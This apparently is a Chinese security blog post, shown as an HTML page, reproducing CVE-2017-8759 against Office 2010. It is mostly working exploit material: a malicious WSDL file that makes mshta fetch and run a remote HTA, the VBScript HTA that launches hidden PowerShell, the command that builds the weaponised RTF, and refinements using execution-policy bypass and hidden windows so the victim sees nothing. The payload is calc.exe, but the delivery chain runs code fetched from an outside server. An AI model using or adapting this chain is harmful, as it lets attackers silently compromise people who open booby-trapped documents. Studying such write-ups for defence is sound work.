<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="Keywords" content="blog"/>
    <meta name="Description" content="blog"/>
    <title>Simple</title>
    <link rel="shortcut icon" href="/static/favicon.png"/>
    <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
<div class="main">
    <div class="header">
    	<ul id="pages">
            <li><a href="/">home</a></li>
            <li><a href="/#/tags">tags</a></li>
            <li><a href="/#/archive">archive</a></li>
    	</ul>
    </div>
	<div class="wrap-header">
    <h1>
    <a href="/" id="title"></a>
    </h1>
	</div>
<xmp id="md" style="display: none;">
<!-- markdown -->
漏洞原理移步 [安全客](https://www.anquanke.com/post/id/86833).

环境 Windows7, Office 2010.

## 复现过程

[bhdresh/CVE-2017-8759](https://github.com/bhdresh/CVE-2017-8759)

搭建服务器, 创建 exploit.txt 并更改 URL.

```
<definitions
    xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">
<portType name="PortType"/>
<binding name="Binding" type="tns:PortType">
<soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
<suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>
</binding>
<service name="Service">
<port name="Port" binding="tns:Binding">
<soap:address location="http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta"/>
<soap:address location=";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //"/>
</port>
</service>
</definitions> 
```

同目录下创建 cmd.hta.

```
<html>
<head>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("powershell.exe -nop -w hidden calc.exe", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>
```

生成文档.

```
cve-2017-8759_toolkit.py -M gen -w test.rtf -u http://192.168.1.1:8000/exploit.txt
```

打开文档.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190801222637.png)

复现成功, 命令只执行了一次, 但这里会先闪一下 hta 的窗口.

最开始复现的时候我有两个问题: 1. 为什么要通过 hta 执行 2. 为什么不能直接在 exploit.txt 中一次执行成功而非要用 hta.

## 改进载荷

关于第一个问题, 请看代码.

```
<soap:address location="http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta"/>
<soap:address location=";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //"/>
```

拼接在源文件中是这样的.

```
......
public Image()
{
    base.ConfigureProxy(this.GetType(), @"http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta");
    //base.ConfigureProxy(this.GetType(),@";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //");
}
......
```

原理中也提到了, 这是 .Net 一处拼接错误而导致的代码执行漏洞, 也就是说理论上我们能够执行任意代码.

而 xml 中的 location, 通过 ? 被分割成三个部分, 然后提取第二部分作为执行文件, 第三部分作为命令参数.

所以这个其实跟空格没有半点关系, 完全就是为了方便通过 ? 截取到命令和参数两个部分, 而第一个部分只是针对 .Net 的验证罢了, 只要符合 URL 规范就行. 之所以在这里要费劲心思截取 url 是因为 xml 语法的问题, 但 C# 的单引号只表示单个字符.

关于第二个问题, 为什么要通过 hta 执行?

如果说是针对低版本系统例如 2003, 那么其实还有很多种选择, 比如 regsvr32, regsvcs, 甚至你也可以直接通过下载 exe 来执行, 但这里访问的 hta 里执行的命令是 powershell, 那么为什么不直接一步到位呢?

前面说了, 这是代码执行漏洞, 理论上我们能够执行任意代码, 同样, 通过 Process.Start 启动的进程理论上也可以是任意文件, 比如.

```
<soap:address location="http://192.168.1.1?C:\Windows\System32\cmd.exe?/c calc.exe"/>
```

这样是能够执行成功的, 但如果换成 powershell 呢?

```
<soap:address location="http://192.168.1.1?C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?-c calc.exe"/>
```

执行失败了. 我们仔细想想这两行代码之间有什么区别, 前者的命令参数是 /c, 后者的命令参数是 -c.

推测是 - 这个字符导致命令执行不成功的, 下面就要引入一个新姿势了.

```
powershell.exe /c calc.exe
```

这是可以成功的, 适用于大部分参数.

加上一点其它东西, 那么代码就可以改成.

```
<soap:address location="http://192.168.1.1?C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?/ep bypass /noprofile /w hidden /c calc.exe"/>
```

执行成功. 不过你会发现 powershell 窗口还是会一闪而过, 即使我们指定了 /w hidden, 怎么办呢?

基于 C# 的特性, 我们可以通过 System.Diagnostics.Process.StartInfo 创建一个进程并将窗口设置为 hidden, 就像这样.

```
p.FileName = _url.Split('?')[1];
p.Arguments = _url.Split('?')[2];
p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
System.Diagnostics.Process.Start(p);
```

重新打开文档, 将会自动弹出计算器而不是先显示一遍窗口 :)

## 一些话

在写下这篇文章的时候又测试了一遍, 发现 -c 其实是可以执行成功的, 但通过带宏文档复现的时候确实是执行失败了, 只能通过 /c 方式绕过, 不过通过宏这种方式利用已经是很鸡肋的了, 还有很多比这更简单的方法.

另外对于 rtf 的其它细节在之前的文章中已经讲过, 这里就不再重复说明了.
<!-- markdown end -->
</xmp>
<div class="entry" id="main">
<!-- content -->
<p>漏洞原理移步 <a href="https://www.anquanke.com/post/id/86833">安全客</a>.</p>

<p>环境 Windows7, Office 2010.</p>

<h2 id="">复现过程</h2>

<p><a href="https://github.com/bhdresh/CVE-2017-8759">bhdresh/CVE-2017-8759</a></p>

<p>搭建服务器, 创建 exploit.txt 并更改 URL.</p>

<pre><code>&lt;definitions
    xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo"&gt;
&lt;portType name="PortType"/&gt;
&lt;binding name="Binding" type="tns:PortType"&gt;
&lt;soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/&gt;
&lt;suds:class type="ns0:Image" rootType="MarshalByRefObject"&gt;&lt;/suds:class&gt;
&lt;/binding&gt;
&lt;service name="Service"&gt;
&lt;port name="Port" binding="tns:Binding"&gt;
&lt;soap:address location="http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta"/&gt;
&lt;soap:address location=";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //"/&gt;
&lt;/port&gt;
&lt;/service&gt;
&lt;/definitions&gt; 
</code></pre>

<p>同目录下创建 cmd.hta.</p>

<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script language="VBScript"&gt;
Sub window_onload
    const impersonation = 3
    Const HIDDEN_WINDOW = 12
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Service = Locator.ConnectServer()
    Service.Security_.ImpersonationLevel=impersonation
    Set objStartup = Service.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set Process = Service.Get("Win32_Process")
    Error = Process.Create("powershell.exe -nop -w hidden calc.exe", null, objConfig, intProcessID)
    window.close()
end sub
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;
</code></pre>

<p>生成文档.</p>

<pre><code>cve-2017-8759_toolkit.py -M gen -w test.rtf -u http://192.168.1.1:8000/exploit.txt
</code></pre>

<p>打开文档.</p>

<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190801222637.png" alt="" title=""></p>

<p>复现成功, 命令只执行了一次, 但这里会先闪一下 hta 的窗口.</p>

<p>最开始复现的时候我有两个问题: 1. 为什么要通过 hta 执行 2. 为什么不能直接在 exploit.txt 中一次执行成功而非要用 hta.</p>

<h2 id="">改进载荷</h2>

<p>关于第一个问题, 请看代码.</p>

<pre><code>&lt;soap:address location="http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta"/&gt;
&lt;soap:address location=";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //"/&gt;
</code></pre>

<p>拼接在源文件中是这样的.</p>

<pre><code>......
public Image()
{
    base.ConfigureProxy(this.GetType(), @"http://192.168.1.1?C:\Windows\System32\mshta.exe?http://192.168.1.1:8000/cmd.hta");
    //base.ConfigureProxy(this.GetType(),@";
    if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
        System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
        System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
    } //");
}
......
</code></pre>

<p>原理中也提到了, 这是 .Net 一处拼接错误而导致的代码执行漏洞, 也就是说理论上我们能够执行任意代码.</p>

<p>而 xml 中的 location, 通过 ? 被分割成三个部分, 然后提取第二部分作为执行文件, 第三部分作为命令参数.</p>

<p>所以这个其实跟空格没有半点关系, 完全就是为了方便通过 ? 截取到命令和参数两个部分, 而第一个部分只是针对 .Net 的验证罢了, 只要符合 URL 规范就行. 之所以在这里要费劲心思截取 url 是因为 xml 语法的问题, 但 C# 的单引号只表示单个字符.</p>

<p>关于第二个问题, 为什么要通过 hta 执行?</p>

<p>如果说是针对低版本系统例如 2003, 那么其实还有很多种选择, 比如 regsvr32, regsvcs, 甚至你也可以直接通过下载 exe 来执行, 但这里访问的 hta 里执行的命令是 powershell, 那么为什么不直接一步到位呢?</p>

<p>前面说了, 这是代码执行漏洞, 理论上我们能够执行任意代码, 同样, 通过 Process.Start 启动的进程理论上也可以是任意文件, 比如.</p>

<pre><code>&lt;soap:address location="http://192.168.1.1?C:\Windows\System32\cmd.exe?/c calc.exe"/&gt;
</code></pre>

<p>这样是能够执行成功的, 但如果换成 powershell 呢?</p>

<pre><code>&lt;soap:address location="http://192.168.1.1?C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?-c calc.exe"/&gt;
</code></pre>

<p>执行失败了. 我们仔细想想这两行代码之间有什么区别, 前者的命令参数是 /c, 后者的命令参数是 -c.</p>

<p>推测是 - 这个字符导致命令执行不成功的, 下面就要引入一个新姿势了.</p>

<pre><code>powershell.exe /c calc.exe
</code></pre>

<p>这是可以成功的, 适用于大部分参数.</p>

<p>加上一点其它东西, 那么代码就可以改成.</p>

<pre><code>&lt;soap:address location="http://192.168.1.1?C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?/ep bypass /noprofile /w hidden /c calc.exe"/&gt;
</code></pre>

<p>执行成功. 不过你会发现 powershell 窗口还是会一闪而过, 即使我们指定了 /w hidden, 怎么办呢?</p>

<p>基于 C# 的特性, 我们可以通过 System.Diagnostics.Process.StartInfo 创建一个进程并将窗口设置为 hidden, 就像这样.</p>

<pre><code>p.FileName = _url.Split('?')[1];
p.Arguments = _url.Split('?')[2];
p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
System.Diagnostics.Process.Start(p);
</code></pre>

<p>重新打开文档, 将会自动弹出计算器而不是先显示一遍窗口 :)</p>

<h2 id="">一些话</h2>

<p>在写下这篇文章的时候又测试了一遍, 发现 -c 其实是可以执行成功的, 但通过带宏文档复现的时候确实是执行失败了, 只能通过 /c 方式绕过, 不过通过宏这种方式利用已经是很鸡肋的了, 还有很多比这更简单的方法.</p>

<p>另外对于 rtf 的其它细节在之前的文章中已经讲过, 这里就不再重复说明了.</p>
<!-- content end -->
</div>
<br>
<br>
    <div id="disqus_thread"></div>
	<div class="footer">
		<p>© Copyright 2017-2019 by X1r0z</p>
	</div>
</div>
<script src="main.js"></script>
<script id="content" type="text/mustache">
    <h1>{{title}}</h1>
    <div class="tag">
    {{date}}
    {{#tags}}
    <a href="/#/tag/{{name}}">#{{name}}</a>
    {{/tags}}
    </div>
</script>
<script id="pagesTemplate" type="text/mustache">
    {{#pages}}
    <li>
        <a href="{{path}}">{{title}}</a>
    </li>
    {{/pages}}
</script>
<script>
$(document).ready(function() {
    $.ajax({
        url: "main.json",
        type: "GET",
        dataType: "json",
        success: function(data) {
            $("#title").html(data.name);
            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
            var pagesHtml = pagesTemplate.render({"pages": data.pages});
            $("#pages").append(pagesHtml);
            //path
            var path = "office-cve-2017-8759.html";
            //path end
            var now = 0;
            for (var i = 0; i < data.posts.length; ++i)
                if (path == data.posts[i].path)
                    now = i;
            var post = data.posts[now];
            var tmp = post.tags.split(" ");
            var tags = [];
            for (var i = 0; i < tmp.length; ++i)
                if (tmp[i].length > 0)
                    tags.push({"name": tmp[i]});
            var contentTemplate = Hogan.compile($("#content").html());
            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
            $("#main").prepend(contentHtml);
            if (data.disqus_shortname.length > 0) {
                var disqus_shortname = data.disqus_shortname;
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            }
        }
    });
});
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
</script>
</body>
</html>
